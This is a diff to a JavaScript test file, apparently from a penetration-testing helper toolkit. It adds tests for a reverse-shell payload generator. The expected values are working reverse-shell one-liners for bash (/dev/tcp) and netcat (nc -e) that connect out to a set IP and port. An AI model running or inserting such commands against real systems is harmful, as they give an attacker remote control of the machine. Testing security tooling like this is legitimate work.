@@ -424,6 +424,17 @@ group("port <-> service lookup");
   ok("empty → null", portLookup("") === null);
 }
 
+group("reverse-shell payloads");
+{
+  const { SHELLS, revshell, shellLangs } = require("../lib/revshell");
+  ok("langs present", shellLangs().length >= 7 && shellLangs().includes("bash") && shellLangs().includes("powershell"));
+  eq("bash exact", revshell("bash", "10.10.14.7", "4444"), "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1");
+  eq("nc exact", revshell("nc", "10.10.14.7", "4444"), "nc -e /bin/sh 10.10.14.7 4444");
+  ok("ip + port interpolated into every payload", shellLangs().every((l) => { const s = revshell(l, "1.2.3.4", "9001"); return s.includes("1.2.3.4") && s.includes("9001"); }));
+  ok("unknown lang falls back to bash", revshell("nope", "5.6.7.8", "1234") === revshell("bash", "5.6.7.8", "1234"));
+  ok("SHELLS entries are builder functions", Object.values(SHELLS).every((f) => typeof f === "function"));
+}
+
 group("help reference (single source of truth)");
 {
   const { COMMAND_GROUPS, documentedVerbs, renderCommands } = require("../lib/reference");
